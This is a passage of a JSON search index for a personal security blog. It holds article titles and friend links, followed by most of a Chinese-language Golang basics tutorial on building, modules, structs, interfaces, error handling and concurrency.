{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Index # Hello world This is Longlone's blog Latest articles # articles mtime \u5b89\u5168 - golang - \u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e09\u7ae0-HTTP 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e94\u7ae0-DNS 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 2021/06/06 \u5b89\u5168 - \u524d\u4eba\u4e4b\u8def - thinkphp 5.1.x RCE 2021/06/05 \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 2021/06/05 \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - webshell\u514d\u6740\u603b\u7ed3 2021/06/05","title":"Index"},{"location":"#index","text":"Hello world This is Longlone's blog","title":"Index"},{"location":"#latest-articles","text":"articles mtime \u5b89\u5168 - golang - \u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e09\u7ae0-HTTP 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e94\u7ae0-DNS 2021/06/06 \u5b89\u5168 - golang - \u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 2021/06/06 \u5b89\u5168 - \u524d\u4eba\u4e4b\u8def - thinkphp 5.1.x RCE 2021/06/05 \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 2021/06/05 \u5b89\u5168 - \u5b89\u5168\u7814\u7a76 - webshell\u514d\u6740\u603b\u7ed3 2021/06/05","title":"Latest articles"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/","text":"\u53cb\u60c5\u94fe\u63a5 # Hacker # syclover # lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum other # Y4tacker morrou","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#\u53cb\u60c5\u94fe\u63a5","text":"","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#hacker","text":"","title":"Hacker"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#syclover","text":"lingze kodosan const27 f4de afkl 0xc4m3l leohearts ljahum","title":"syclover"},{"location":"%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/#other","text":"Y4tacker morrou","title":"other"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/","text":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 # \u73af\u5883\u642d\u5efa # \u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883 go build # \u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go go doc # \u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { } go mod(golang v1.11\u53ca\u4ee5\u4e0a) # \u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305 go \u53d8\u91cf\u4e0e\u5e38\u91cf # \u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 ) go \u7ed3\u6784\u4f53 # \u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) } go \u63a5\u53e3 # \u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) } go \u5f02\u5e38\u5904\u7406 # \u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () } go \u5e76\u53d1\u4e0e\u4fe1\u9053 # \u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) } go \u9501\u4e0eWaitGroup # go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u7b2c\u4e00\u7ae0-golang\u57fa\u7840","text":"","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u73af\u5883\u642d\u5efa","text":"\u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-build","text":"\u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go","title":"go build"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-doc","text":"\u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { }","title":"go doc"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-modgolang-v111\u53ca\u4ee5\u4e0a","text":"\u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305","title":"go mod(golang v1.11\u53ca\u4ee5\u4e0a)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u53d8\u91cf\u4e0e\u5e38\u91cf","text":"\u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 )","title":"go \u53d8\u91cf\u4e0e\u5e38\u91cf"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u7ed3\u6784\u4f53","text":"\u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) }","title":"go \u7ed3\u6784\u4f53"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u63a5\u53e3","text":"\u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) }","title":"go \u63a5\u53e3"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5f02\u5e38\u5904\u7406","text":"\u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) 